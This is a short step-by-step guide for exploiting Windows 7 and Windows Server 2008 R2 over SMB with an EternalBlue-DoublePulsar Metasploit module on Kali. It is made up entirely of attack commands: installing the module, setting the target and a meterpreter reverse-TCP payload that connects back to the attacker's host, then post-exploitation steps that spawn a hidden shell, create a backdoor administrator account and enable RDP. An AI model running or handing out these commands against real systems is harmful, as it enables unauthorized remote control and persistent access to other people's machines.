// Step by step exploit Windows 7, Windows Server 2008 R2 POC with Metasploit (I use Kali 2019.2)

mkdir -p /root/.wine/drive_c
chmod 777 /root/.wine/drive_c/ -R
apt-get install winetricks
dpkg --add-architecture i386 && apt-get update && apt-get install wine32
git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit.git
cd Eternalblue-Doublepulsar-Metasploit/
cp eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/



use exploit/windows/smb/eternalblue_doublepulsar
set rhost 192.168.1.105
set processinject svchost.exe 		// for x86
#set processinject lsass.exe 		// for x64

set TARGETARCHITECTURE x86
set TARGETARCHITECTURE x64

set payload windows/meterpreter/reverse_tcp 		// for x86
#set payload windows/x64/meterpreter/reverse_tcp 	// for x64

set lhost 192.168.1.161

exploit 



// Run CMD
execute -f cmd.exe -H -i

// Add new user
net user /add [username] [pass]

// Add user to administrators group.
net localgroup administrators [username] /add

// Open RDP port
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
